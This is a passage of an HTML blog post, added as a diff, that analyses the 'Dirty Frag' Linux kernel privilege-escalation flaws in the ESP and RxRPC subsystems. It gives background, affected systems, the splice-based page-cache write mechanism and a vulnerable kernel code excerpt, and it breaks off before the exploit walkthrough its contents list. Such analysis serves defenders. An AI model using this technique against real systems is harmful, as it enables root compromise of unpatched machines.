@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dirty Frag: CVE-2026-43284 & CVE-2026-43500 — Copy Fail's Harder Sibling</title>
+<meta name="description" content="A deep dive into Dirty Frag (CVE-2026-43284, CVE-2026-43500) — the Linux kernel LPE that chains xfrm-ESP and RxRPC page-cache write primitives to root every major distro, and bypasses the Copy Fail mitigation entirely.">
+<link rel="shortcut icon" href="../assets/img/front-face.png" type="image/x-icon">
+<meta property="og:title" content="Dirty Frag: CVE-2026-43284 & CVE-2026-43500 — Copy Fail's Harder Sibling">
+<meta property="og:description" content="Deep dive into the Linux kernel page-cache poisoning vulnerability that chains two separate kernel flaws to root Ubuntu, RHEL, Fedora, and openSUSE — and defeats the Copy Fail algif_aead mitigation.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="https://github.com/cyb3r-w0lf.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+:root{
+  --bg:#0d0f14;
+  --surface:#131720;
+  --surface2:#181e2a;
+  --surface3:#1c2235;
+  --border:rgba(18,189,255,0.12);
+  --border2:rgba(18,189,255,0.25);
+  --accent:#12bdff;
+  --accent-dim:rgba(18,189,255,0.12);
+  --accent-glow:rgba(18,189,255,0.30);
+  --red:#ff5f5f;
+  --red-dim:rgba(255,95,95,0.12);
+  --orange:#ffaa44;
+  --orange-dim:rgba(255,170,68,0.10);
+  --green:#3ddc97;
+  --green-dim:rgba(61,220,151,0.10);
+  --purple:#b5a0ff;
+  --purple-dim:rgba(181,160,255,0.10);
+  --text:#e8eaf0;
+  --text2:#8892a4;
+  --text3:#4a5368;
+  --mono:'JetBrains Mono',monospace;
+  --display:'Syne',sans-serif;
+  --transition:0.3s cubic-bezier(0.4,0,0.2,1);
+}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:15px;line-height:1.8;-webkit-font-smoothing:antialiased;overflow-x:hidden;}
+body::before{content:'';pointer-events:none;position:fixed;inset:0;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);}
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--accent);border-radius:3px;}
+::selection{background:var(--accent-dim);color:var(--accent);}
+a{text-decoration:none;color:var(--accent);transition:color var(--transition);}
+a:hover{color:#fff;}
+img{max-width:100%;height:auto;display:block;}
+
+.site-header{
+  background:rgba(13,15,20,.92);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+  padding:0 48px;height:64px;display:flex;align-items:center;justify-content:space-between;
+  position:sticky;top:0;z-index:800;border-bottom:1px solid var(--border);
+}
+.logo{font-family:var(--mono);font-size:.95rem;font-weight:600;display:flex;align-items:center;gap:10px;color:var(--text);}
+.logo img{width:30px;height:30px;border-radius:50%;border:2px solid var(--accent);transition:box-shadow var(--transition);}
+.logo img:hover{box-shadow:0 0 12px var(--accent-glow);}
+.logo-accent{color:var(--accent);}
+.header-nav{display:flex;align-items:center;gap:10px;}
+.nav-btn{
+  font-family:var(--mono);font-size:.78rem;color:var(--text2);
+  display:flex;align-items:center;gap:6px;
+  padding:6px 14px;border-radius:6px;border:1px solid transparent;
+  transition:all var(--transition);
+}
+.nav-btn.primary{background:var(--accent-dim);border-color:var(--border2);color:var(--accent);}
+.nav-btn.primary:hover{background:var(--accent);color:var(--bg);}
+.nav-btn:not(.primary):hover{color:var(--text);border-color:var(--border);}
+
+.hero-grid{
+  position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+  background-size:60px 60px;
+  mask-image:radial-gradient(ellipse 70% 60% at 50% 20%,black 20%,transparent 80%);
+  -webkit-mask-image:radial-gradient(ellipse 70% 60% at 50% 20%,black 20%,transparent 80%);
+  opacity:.5;
+}
+
+.article-hero{
+  max-width:800px;margin:0 auto;padding:72px 24px 52px;position:relative;z-index:1;
+}
+.article-hero .inner{position:relative;}
+.section-tag{font-size:.72rem;color:var(--accent);opacity:.85;letter-spacing:.1em;display:inline-block;margin-bottom:14px;}
+.article-hero h1{
+  font-family:var(--display);font-size:clamp(1.5rem,3.5vw,2.2rem);font-weight:800;
+  letter-spacing:-.03em;line-height:1.25;margin-bottom:18px;color:var(--text);
+  text-wrap:balance;
+}
+.article-hero h1 span{color:var(--accent);}
+.article-meta{display:flex;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:28px;}
+.meta-date{font-size:.72rem;color:var(--text3);}
+.meta-badge{
+  font-size:.62rem;letter-spacing:.08em;text-transform:uppercase;
+  padding:3px 9px;border-radius:4px;font-weight:500;border:1px solid;font-family:var(--mono);
+}
+.badge-linux{background:rgba(61,220,151,.1);color:var(--green);border-color:rgba(61,220,151,.22);}
+.badge-lpe{background:rgba(255,95,95,.1);color:var(--red);border-color:rgba(255,95,95,.22);}
+.badge-cve{background:rgba(181,160,255,.1);color:var(--purple);border-color:rgba(181,160,255,.22);}
+.badge-latest{background:rgba(18,189,255,.12);color:var(--accent);border-color:var(--border2);}
+.tldr-card{
+  background:var(--surface2);border:1px solid var(--border2);border-radius:12px;
+  padding:24px 28px;margin-top:24px;
+}
+.tldr-card .tldr-label{font-size:.68rem;letter-spacing:.1em;color:var(--accent);margin-bottom:10px;}
+.tldr-card p{font-size:.88rem;color:var(--text2);line-height:1.85;}
+
+.article-body{max-width:800px;margin:0 auto;padding:0 24px 100px;position:relative;z-index:1;}
+
+.toc-card{
+  background:var(--surface);border:1px solid var(--border);border-radius:12px;
+  padding:24px 28px;margin-bottom:52px;
+}
+.toc-card h3{font-family:var(--display);font-size:.92rem;font-weight:700;color:var(--text);margin-bottom:16px;display:flex;align-items:center;gap:8px;}
+.toc-card h3 i{color:var(--accent);font-size:.82rem;}
+.toc-list{list-style:none;display:flex;flex-direction:column;gap:6px;}
+.toc-list li{display:flex;align-items:baseline;gap:8px;}
+.toc-list .toc-num{font-size:.66rem;color:var(--accent);min-width:18px;}
+.toc-list a{font-size:.82rem;color:var(--text2);transition:color var(--transition);}
+.toc-list a:hover{color:var(--accent);}
+.toc-sub{margin-left:26px;margin-top:4px;}
+.toc-sub li .toc-num{color:var(--text3);}
+
+.article-section{margin-bottom:64px;}
+.section-heading{
+  font-family:var(--display);font-size:1.35rem;font-weight:800;
+  color:var(--text);letter-spacing:-.02em;margin-bottom:20px;
+  display:flex;align-items:center;gap:10px;
+}
+.section-heading .sh-icon{color:var(--accent);font-size:1.1rem;flex-shrink:0;}
+.subsection{margin-bottom:40px;}
+.subsection-heading{
+  font-family:var(--display);font-size:1.05rem;font-weight:700;
+  color:var(--text);letter-spacing:-.01em;margin-bottom:14px;
+  display:flex;align-items:center;gap:10px;
+}
+.subsection-heading::before{content:'//';color:var(--accent);font-family:var(--mono);font-size:.8rem;opacity:.7;}
+p{font-size:.9rem;color:var(--text2);line-height:1.85;margin-bottom:14px;}
+p:last-child{margin-bottom:0;}
+
+.callout{border-radius:10px;padding:18px 22px;margin:22px 0;border-left:3px solid;font-size:.86rem;line-height:1.78;}
+.callout strong{display:block;font-size:.74rem;letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px;}
+.callout-danger{background:var(--red-dim);border-color:var(--red);color:#ffa0a0;}
+.callout-danger strong{color:var(--red);}
+.callout-info{background:var(--accent-dim);border-color:var(--accent);color:#90d8f0;}
+.callout-info strong{color:var(--accent);}
+.callout-tip{background:var(--green-dim);border-color:var(--green);color:#90ddb8;}
+.callout-tip strong{color:var(--green);}
+.callout-warn{background:var(--orange-dim);border-color:var(--orange);color:#f0c880;}
+.callout-warn strong{color:var(--orange);}
+
+.code-block{
+  background:#0a0c10;border:1px solid var(--border);border-radius:10px;
+  margin:20px 0;overflow:hidden;
+}
+.code-block .cb-header{
+  background:var(--surface2);padding:10px 18px;display:flex;align-items:center;
+  justify-content:space-between;border-bottom:1px solid var(--border);
+}
+.cb-lang{font-size:.68rem;letter-spacing:.08em;color:var(--accent);text-transform:uppercase;}
+.cb-file{font-size:.68rem;color:var(--text3);}
+.code-block pre{padding:20px 18px;overflow-x:auto;font-size:.82rem;line-height:1.7;}
+.code-block code{font-family:var(--mono);color:#c9d1d9;}
+.hl-kw{color:#ff79c6;}
+.hl-fn{color:#50fa7b;}
+.hl-str{color:#f1fa8c;}
+.hl-cm{color:#6272a4;}
+.hl-num{color:#bd93f9;}
+.hl-type{color:#8be9fd;}
+.hl-macro{color:#ffb86c;}
+.hl-acc{color:var(--accent);}
+.hl-red{color:var(--red);}
+.hl-green{color:var(--green);}
+.hl-orange{color:var(--orange);}
+
+.steps{display:flex;flex-direction:column;gap:0;}
+.step-card{
+  display:flex;gap:20px;padding:24px 0;
+  border-bottom:1px solid var(--border);
+}
+.step-card:last-child{border-bottom:none;}
+.step-num{
+  min-width:36px;height:36px;border-radius:50%;
+  background:var(--accent-dim);border:1px solid var(--border2);
+  display:flex;align-items:center;justify-content:center;
+  font-size:.72rem;font-weight:600;color:var(--accent);flex-shrink:0;margin-top:2px;
+}
+.step-body h4{font-family:var(--display);font-size:.98rem;font-weight:700;color:var(--text);margin-bottom:8px;}
+.step-body p{font-size:.86rem;}
+
+/* two-column variant comparison */
+.variant-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:24px 0;}
+.variant-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:20px 22px;}
+.variant-card .vc-label{font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);margin-bottom:10px;display:block;}
+.variant-card h4{font-family:var(--display);font-size:.98rem;font-weight:700;color:var(--text);margin-bottom:10px;}
+.variant-card ul{list-style:none;display:flex;flex-direction:column;gap:6px;}
+.variant-card ul li{font-size:.82rem;color:var(--text2);padding-left:16px;position:relative;}
+.variant-card ul li::before{content:'▸';position:absolute;left:0;color:var(--accent);font-size:.7rem;top:2px;}
+@media(max-width:640px){.variant-grid{grid-template-columns:1fr;}}
+
+.chain{
+  background:var(--surface);border:1px solid var(--border);border-radius:12px;
+  padding:24px;margin:24px 0;display:flex;flex-direction:column;gap:0;
+}
+.chain-item{display:flex;align-items:flex-start;gap:16px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.04);}
+.chain-item:last-child{border-bottom:none;}
+.chain-arrow{display:flex;flex-direction:column;align-items:center;flex-shrink:0;width:28px;}
+.chain-dot{width:10px;height:10px;border-radius:50%;background:var(--accent);flex-shrink:0;margin-top:5px;}
+.chain-dot.red{background:var(--red);}
+.chain-dot.orange{background:var(--orange);}
+.chain-dot.green{background:var(--green);}
+.chain-line{width:1px;background:var(--border2);flex:1;min-height:20px;margin-top:4px;}
+.chain-item:last-child .chain-line{display:none;}
+.chain-text{flex:1;}
+.chain-text strong{font-size:.88rem;color:var(--text);display:block;margin-bottom:2px;}
+.chain-text span{font-size:.78rem;color:var(--text3);}
+
+.compare-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:.84rem;}
+.compare-table th{background:var(--surface2);color:var(--accent);font-size:.72rem;letter-spacing:.08em;text-transform:uppercase;padding:10px 14px;text-align:left;border-bottom:1px solid var(--border2);}
+.compare-table td{padding:10px 14px;border-bottom:1px solid var(--border);color:var(--text2);vertical-align:top;}
+.compare-table tr:last-child td{border-bottom:none;}
+.compare-table .ok{color:var(--green);}
+.compare-table .fail{color:var(--red);}
+.compare-table .warn{color:var(--orange);}
+
+.section-divider{border:none;border-top:1px solid var(--border);margin:52px 0;}
+
+.ic{
+  font-family:var(--mono);font-size:.83em;
+  background:rgba(18,189,255,.08);border:1px solid rgba(18,189,255,.15);
+  color:var(--accent);padding:1px 6px;border-radius:4px;
+}
+
+.run-cmd{
+  background:#0a0c10;border:1px solid var(--border);border-radius:8px;
+  padding:12px 18px;font-family:var(--mono);font-size:.85rem;color:var(--green);
+  display:block;margin-bottom:8px;
+}
+
+.refs-list{display:flex;flex-direction:column;gap:14px;margin-top:4px;}
+.ref-item{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px 22px;display:flex;flex-direction:column;gap:6px;transition:border-color var(--transition);}
+.ref-item:hover{border-color:var(--border2);}
+.ref-meta{display:flex;align-items:center;gap:10px;}
+.ref-tag{font-size:.62rem;letter-spacing:.08em;text-transform:uppercase;padding:2px 8px;border-radius:4px;border:1px solid;font-family:var(--mono);font-weight:500;}
+.ref-tag-primary{background:rgba(18,189,255,.1);color:var(--accent);border-color:var(--border2);}
+.ref-tag-research{background:rgba(181,160,255,.1);color:var(--purple);border-color:rgba(181,160,255,.22);}
+.ref-tag-advisory{background:rgba(255,170,68,.1);color:var(--orange);border-color:rgba(255,170,68,.22);}
+.ref-tag-vendor{background:rgba(61,220,151,.1);color:var(--green);border-color:rgba(61,220,151,.22);}
+.ref-tag-patch{background:rgba(255,95,95,.1);color:var(--red);border-color:rgba(255,95,95,.22);}
+.ref-url{font-size:.72rem;color:var(--text3);font-family:var(--mono);margin-left:auto;}
+.ref-title{font-family:var(--display);font-size:.95rem;font-weight:700;color:var(--text);transition:color var(--transition);}
+.ref-item:hover .ref-title{color:var(--accent);}
+.ref-item p{font-size:.83rem;color:var(--text2);margin:0;}
+
+footer{background:var(--bg);border-top:1px solid var(--border);padding:28px 48px;}
+.footer-inner{max-width:800px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;}
+.footer-logo{font-family:var(--mono);font-size:.85rem;font-weight:600;color:var(--accent);}
+footer p{font-size:.72rem;color:var(--text3);}
+.footer-links{display:flex;gap:18px;}
+.footer-links a{font-size:.72rem;color:var(--text2);transition:color var(--transition);}
+.footer-links a:hover{color:var(--accent);}
+
+.copy-btn{font-family:var(--mono);font-size:.66rem;color:var(--text3);background:transparent;border:1px solid var(--border);border-radius:4px;padding:3px 9px;cursor:pointer;transition:all var(--transition);display:flex;align-items:center;gap:5px;}
+.copy-btn:hover{color:var(--accent);border-color:var(--border2);}
+.copy-btn.copied{color:var(--green);border-color:rgba(61,220,151,.3);}
+
+@media(max-width:640px){
+  .site-header{padding:0 16px;}
+  .article-hero{padding:48px 16px 36px;}
+  .article-body{padding:0 16px 80px;}
+  footer{padding:20px 16px;}
+  .footer-inner{flex-direction:column;align-items:flex-start;gap:8px;}
+  .compare-table{font-size:.76rem;}
+  .compare-table th,.compare-table td{padding:8px 10px;}
+}
+</style>
+</head>
+<body>
+
+<div class="hero-grid" aria-hidden="true"></div>
+
+<header class="site-header">
+  <a href="../index.html" class="logo">
+    <img src="https://github.com/cyb3r-w0lf.png" alt="cyb3r-w0lf github avatar">
+    <span>~/</span><span class="logo-accent">cyb3r-w0lf</span>
+  </a>
+  <nav class="header-nav">
+    <a href="./index.html" class="nav-btn"><i class="fa-solid fa-arrow-left"></i> All Posts</a>
+    <a href="../index.html" class="nav-btn primary"><i class="fa-solid fa-house"></i> Portfolio</a>
+  </nav>
+</header>
+
+<main>
+<div class="article-hero">
+  <div class="inner">
+    <span class="section-tag">// linux kernel · cve-2026-43284 · cve-2026-43500</span>
+    <h1>Dirty Frag: <span>Copy Fail's Harder Sibling</span> That Beats Your Mitigation</h1>
+    <div class="article-meta">
+      <span class="meta-date"><i class="fa-regular fa-calendar"></i>&nbsp;May 2026</span>
+      <span class="meta-badge badge-latest">Latest</span>
+      <span class="meta-badge badge-linux">Linux</span>
+      <span class="meta-badge badge-lpe">LPE</span>
+      <span class="meta-badge badge-cve">CVE-2026-43284</span>
+      <span class="meta-badge badge-cve">CVE-2026-43500</span>
+    </div>
+    <div class="tldr-card">
+      <div class="tldr-label">// TL;DR</div>
+      <p>One week after Copy Fail, researcher Hyunwoo Kim (@v4bel) dropped a second Linux kernel page-cache poisoning vulnerability — Dirty Frag — that chains two independent flaws in the IPsec ESP and RxRPC networking subsystems to achieve the same arbitrary in-memory write-to-root primitive. The critical twist: it works even on systems where the Copy Fail mitigation (blacklisting <span class="ic">algif_aead</span>) has already been applied. Affects Ubuntu, RHEL, Fedora, openSUSE, CentOS Stream, and AlmaLinux. A public one-liner PoC has existed since May 7, 2026. The xfrm-ESP variant (CVE-2026-43284) is patched in mainline; the RxRPC variant (CVE-2026-43500) has no upstream patch yet.</p>
+    </div>
+  </div>
+</div>
+
+<div class="article-body">
+
+  <nav class="toc-card" aria-label="Table of contents">
+    <h3><i class="fa-solid fa-list"></i> Table of Contents</h3>
+    <ol class="toc-list">
+      <li><span class="toc-num">1.</span><a href="#s1">Background — Dirty Frag and the "Dirty" Lineage</a></li>
+      <ul class="toc-sub">
+        <li><span class="toc-num">1.1</span><a href="#s1-1">The plain-English summary</a></li>
+        <li><span class="toc-num">1.2</span><a href="#s1-2">Affected systems at a glance</a></li>
+        <li><span class="toc-num">1.3</span><a href="#s1-3">How Copy Fail and Dirty Frag relate</a></li>
+      </ul>
+      <li><span class="toc-num">2.</span><a href="#s2">Key Concepts — splice(), sk_buff Frags, and In-Place Crypto</a></li>
+      <li><span class="toc-num">3.</span><a href="#s3">Variant 1: xfrm-ESP Page-Cache Write (CVE-2026-43284)</a></li>
+      <ul class="toc-sub">
+        <li><span class="toc-num">3.1</span><a href="#s3-1">Root cause — the skb_cow_data bypass</a></li>
+        <li><span class="toc-num">3.2</span><a href="#s3-2">The 4-byte write primitive</a></li>
+        <li><span class="toc-num">3.3</span><a href="#s3-3">Exploit flow — ELF injection into /usr/bin/su</a></li>
+      </ul>
+      <li><span class="toc-num">4.</span><a href="#s4">Variant 2: RxRPC Page-Cache Write (CVE-2026-43500)</a></li>
+      <ul class="toc-sub">
+        <li><span class="toc-num">4.1</span><a href="#s4-1">Root cause — in-place pcbc(fcrypt) decrypt on spliced frags</a></li>
+        <li><span class="toc-num">4.2</span><a href="#s4-2">The 8-byte brute-forced write primitive</a></li>
+        <li><span class="toc-num">4.3</span><a href="#s4-3">Exploit flow — /etc/passwd nulling</a></li>
+      </ul>
+      <li><span class="toc-num">5.</span><a href="#s5">Why Chaining? Covering Each Other's Blind Spots</a></li>
+      <li><span class="toc-num">6.</span><a href="#s-poc">PoC Deep Dive — Reading exp.c</a></li>
+      <ul class="toc-sub">
+        <li><span class="toc-num">6.1</span><a href="#s-poc">Top-level structure and ELF payload</a></li>
+        <li><span class="toc-num">6.2</span><a href="#s-poc">ESP variant: SA setup and write trigger</a></li>
+        <li><span class="toc-num">6.3</span><a href="#s-poc">RxRPC variant: handshake, splice, brute-force</a></li>
+      </ul>
+      <li><span class="toc-num">7.</span><a href="#s6">Detection Strategies</a></li>
+      <li><span class="toc-num">8.</span><a href="#s7">Mitigation — Check and Patch Now</a></li>
+      <li><span class="toc-num">9.</span><a href="#refs">References &amp; Further Reading</a></li>
+    </ol>
+  </nav>
+
+  <!-- SECTION 1 -->
+  <section class="article-section" id="s1">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-circle-info"></i> Background — Dirty Frag and the "Dirty" Lineage</h2>
+
+    <div class="subsection" id="s1-1">
+      <h3 class="subsection-heading">The Plain-English Summary</h3>
+      <p>The Linux kernel keeps file contents in RAM (the page cache) so it does not have to re-read from disk on every access. Dirty Frag is a class of vulnerabilities where an unprivileged attacker can silently overwrite selected bytes of that in-RAM copy for any file they can read, without ever touching the on-disk copy and without setting the dirty flag that would cause it to be detected or flushed.</p>
+      <p>In the xfrm-ESP variant, the attacker uses the IPsec subsystem's <span class="ic">esp_input()</span> receive path to achieve a precise 4-byte write at an attacker-controlled offset in any readable file's page cache. In the RxRPC variant, they use the AFS/RxRPC networking stack's packet verification path to achieve an 8-byte write via a brute-force key search. By repeating either write primitive across a target binary, the attacker injects shellcode that runs as root.</p>
+      <div class="callout callout-danger">
+        <strong>Critical — Embargo Broken</strong>
+        Dirty Frag was reported to kernel security on April 29–30, 2026 by Hyunwoo Kim (@v4bel). An embargo of 5 days was set with distribution maintainers on May 7, 2026. That same day, a third party independently published the full xfrm-ESP exploit publicly, breaking the embargo. The researcher and distro maintainers then agreed to full public disclosure immediately. As of May 8, 2026: the xfrm-ESP patch is merged mainline (commit <span class="ic">f4c50a4034e6</span>), but the RxRPC patch has no upstream merge yet, and no distribution has shipped either fix through standard update channels.
+      </div>
+    </div>
+
+    <div class="subsection" id="s1-2">
+      <h3 class="subsection-heading">Affected Systems at a Glance</h3>
+      <p>The xfrm-ESP vulnerability was introduced in kernel commit <span class="ic">cac2661c53f3</span> (January 2017), making kernels from approximately <strong>v4.9 through the present</strong> vulnerable. The RxRPC vulnerability was introduced in commit <span class="ic">2dc334f1a63a</span> (June 2023) and only affects kernels from that point forward. Together, the dual-chain exploit covers essentially every unpatched Linux kernel in the wild today. Either one or both variants apply depending on the distro and kernel configuration.</p>
+
+      <table class="compare-table">
+        <thead>
+          <tr><th>System</th><th>ESP Variant</th><th>RxRPC Variant</th><th>Chain Result</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Ubuntu 22.04 / 24.04</td><td class="fail">Vulnerable</td><td class="fail">Vulnerable (rxrpc built-in)</td><td class="fail">Root via either path</td></tr>
+          <tr><td>RHEL 10 / CentOS Stream 10</td><td class="fail">Vulnerable</td><td class="ok">Not affected (no rxrpc.ko)</td><td class="warn">Root via ESP only</td></tr>
+          <tr><td>AlmaLinux 8</td><td class="fail">Vulnerable</td><td class="ok">Not affected (no rxrpc.ko)</td><td class="warn">Root via ESP only</td></tr>
+          <tr><td>Fedora 44</td><td class="fail">Vulnerable</td><td class="ok">Depends on build config</td><td class="fail">Root via ESP</td></tr>
+          <tr><td>openSUSE Tumbleweed</td><td class="fail">Vulnerable</td><td class="ok">No rxrpc.ko</td><td class="warn">Root via ESP only</td></tr>
+          <tr><td>Ubuntu with AppArmor user-ns block</td><td class="ok">Blocked (no CAP_NET_ADMIN)</td><td class="fail">Vulnerable (no unshare needed)</td><td class="fail">Root via RxRPC</td></tr>
+          <tr><td>Android</td><td class="ok">Not affected</td><td class="ok">Not affected</td><td class="ok">Not vulnerable</td></tr>
+          <tr><td>gVisor containers</td><td class="ok">Not affected</td><td class="ok">Not affected</td><td class="ok">Not vulnerable</td></tr>
+          <tr><td>AWS Fargate / Firecracker</td><td class="ok">Isolated per-VM kernel</td><td class="ok">Isolated per-VM kernel</td><td class="ok">Not vulnerable</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="subsection" id="s1-3">
+      <h3 class="subsection-heading">How Copy Fail and Dirty Frag Relate</h3>
+      <p>Copy Fail (CVE-2026-31431) and Dirty Frag's ESP variant share the same <em>sink</em> — the <span class="ic">scatterwalk_map_and_copy()</span> call inside <span class="ic">crypto_authenc_esn_decrypt()</span> that performs a 4-byte scratch write during Extended Sequence Number rearrangement. The difference is in the <em>source path</em> that lands attacker-controlled pages there: Copy Fail uses the <span class="ic">AF_ALG</span> userspace crypto socket, while Dirty Frag's ESP variant goes through the normal IPsec receive path via <span class="ic">esp_input()</span>. They are two different roads to the same dangerous intersection.</p>
+      <p>This distinction is critical. Copy Fail's mitigation, blacklisting the <span class="ic">algif_aead</span> kernel module, shuts the AF_ALG door. It does absolutely nothing to the <span class="ic">esp_input()</span> path, which lives in a completely different part of the kernel. Every system that applied the Copy Fail mitigation and thought it was protected is still fully exposed to Dirty Frag.</p>
+      <div class="callout callout-warn">
+        <strong>Your Copy Fail Mitigation Is Not Enough</strong>
+        If you blacklisted <span class="ic">algif_aead</span> after Copy Fail, you have not protected yourself from Dirty Frag. The two exploits use different kernel entry points. You must apply the Dirty Frag mitigations separately.
+      </div>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION 2 -->
+  <section class="article-section" id="s2">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-puzzle-piece"></i> Key Concepts — splice(), sk_buff Frags, and In-Place Crypto</h2>
+
+    <p>To understand both variants, you need to understand how three kernel facilities interact in ways their designers never intended to be combined.</p>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">splice() and Zero-Copy Semantics</h3>
+      <p>Normally, when a program reads a file and sends it over a network, the data has to travel: disk → kernel page cache → a copy in userspace → back into the kernel's network buffers. <span class="ic">splice()</span> short-circuits this: it moves data directly between two kernel file descriptors — for example, from a file directly into a pipe, or from a pipe into a socket — without ever copying bytes through userspace.</p>
+      <p>The key detail: when you <span class="ic">splice()</span> a file into a pipe, the kernel doesn't copy the file's bytes. It hands the pipe a <em>reference</em> — a pointer — to the same physical memory page already sitting in the page cache. The pipe now holds a reference to the exact same page the kernel uses to represent the file in RAM. When that pipe is then spliced into a socket, those page references travel through the network stack still attached to the original page cache memory. Internally, they end up embedded in a kernel network packet structure (<span class="ic">struct sk_buff</span>) as "frag" entries — pointers into pages the attacker originally only had <em>read</em> access to.</p>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">struct sk_buff and Nonlinear Data</h3>
+      <p>Every network packet the Linux kernel processes is wrapped in a structure called <span class="ic">struct sk_buff</span> (socket buffer). A packet's payload can live in two places: a contiguous block of private kernel memory (the "linear" area), or spread across a list of external page fragments (the "frag" array) when zero-copy paths like <span class="ic">splice()</span> are used.</p>
+      <p>The distinction matters enormously here. Pages in the frag array via <span class="ic">splice()</span> are <em>shared</em> — the kernel network stack doesn't own them exclusively; they are still the same physical pages backing the original file in the page cache. After the Dirty Frag patch, the kernel marks these with an <span class="ic">SKBFL_SHARED_FRAG</span> flag. Before the patch, some receive paths — specifically the IPsec ESP and RxRPC paths — never checked whether the frags they were about to decrypt in-place were privately owned or externally shared.</p>
+    </div>
+
+    <div class="subsection">
+      <h3 class="subsection-heading">In-Place Crypto: The Root of Both Bugs</h3>
+      <p>When the kernel encrypts or decrypts data, it needs an input buffer (ciphertext) and an output buffer (plaintext). Allocating two separate buffers costs memory and time. An optimization called <em>in-place</em> crypto reuses the same buffer for both: it reads the ciphertext, decrypts it, and writes the plaintext back into the exact same memory location. This is completely safe — as long as that memory is a private kernel buffer that nobody else can see.</p>
+      <p>The bug: when the buffer being decrypted in-place is actually a page cache page planted there via <span class="ic">splice()</span>, "writing the plaintext back" means writing into the file's in-RAM copy. The kernel has just used its own crypto engine to overwrite bytes in a file the attacker was only allowed to read. The on-disk file is never touched. The dirty flag is never set. The change is invisible to every tool that looks at the disk.</p>
+      <div class="callout callout-info">
+        <strong>The Shared Pattern Behind Both Variants</strong>
+        Both Dirty Frag variants follow the same three-step blueprint: (1) use <span class="ic">splice(file → pipe → socket)</span> to plant a page cache page reference into a network packet's frag slot; (2) trigger a kernel receive path that performs in-place crypto on the packet payload without first making a private copy; (3) the decrypt operation writes attacker-influenced bytes directly into the file's page cache. The on-disk file is untouched. The change survives until the page is evicted or the cache is explicitly dropped.
+      </div>
+    </div>
+  </section>
+
+  <hr class="section-divider">
+
+  <!-- SECTION 3 -->
+  <section class="article-section" id="s3">
+    <h2 class="section-heading"><i class="sh-icon fa-solid fa-bug"></i> Variant 1: xfrm-ESP Page-Cache Write (CVE-2026-43284)</h2>
+
+    <div class="subsection" id="s3-1">
+      <h3 class="subsection-heading">Root Cause — The skb_cow_data Bypass</h3>
+      <p>The IPsec ESP receive function <span class="ic">esp_input()</span> is responsible for decrypting incoming ESP-encapsulated packets. Before performing in-place AEAD decryption, it should call <span class="ic">skb_cow_data()</span> to allocate a private copy of any nonlinear data if the skb is "cloned" (shared). However, the function contains an optimization branch that skips this copy when conditions appear safe:</p>
+
+      <div class="code-block">
+        <div class="cb-header"><span class="cb-lang">C</span><span class="cb-file">net/ipv4/esp4.c — vulnerable branch</span></div>
+        <pre><code><span class="hl-kw">static int</span> <span class="hl-fn">esp_input</span>(<span class="hl-kw">struct</span> <span class="hl-type">xfrm_state</span> *x, <span class="hl-kw">struct</span> <span class="hl-type">sk_buff</span> *skb)
+{
+    [...]
+    <span class="hl-kw">if</span> (!<span class="hl-fn">skb_cloned</span>(skb)) {
+        <span class="hl-kw">if</span> (!<span class="hl-fn">skb_is_nonlinear</span>(skb)) {
+            nfrags = <span class="hl-num">1</span>;
+            <span class="hl-kw">goto</span> skip_cow;
+        } <span class="hl-kw">else if</span> (!<span class="hl-fn">skb_has_frag_list</span>(skb)) {
+            nfrags = skb_shinfo(skb)->nr_frags;
+            nfrags++;
+            <span class="hl-kw">goto</span> skip_cow;  <span class="hl-cm">/* ← BUG: skips copy for frags! */</span>
+        }
+    }
+    <span class="hl-cm">/* Normal safe path — allocates private copy */</span>
+    err = <span class="hl-fn">skb_cow_data</span>(skb, <span class="hl-num">0</span>, &trailer);
+    [...]</code></pre>
+      </div>
+
+      <p>The logic checks: <em>"is the skb non-cloned AND does it have frags but no frag_list?"</em> If so, skip the cow. The reasoning was that a non-cloned skb with simple frags is safe to modify in-place. What the code failed to account for is that those frags may be <em>externally shared</em> pages planted by <span class="ic">splice()</span> — which are not cloned in the <span class="ic">skb_cloned()</span> sense, but are absolutely not private kernel memory.</p>
+    </div>
+
+    <div class="subsection" id="s3-2">
+      <h3 class="subsection-heading">The 4-Byte Write Primitive</h3>
+      <p>Once the cow bypass is triggered, <span class="ic">esp_input()</span> calls <span class="ic">crypto_authenc_esn_decrypt()</span> on an skb whose frags contain attacker-pinned page cache pages. That function performs Extended Sequence Number rearrangement by writing 4 bytes to a specific location in the destination scatter-gather list — <em>before</em> HMAC authentication is verified:</p>
+
+      <div class="code-block">
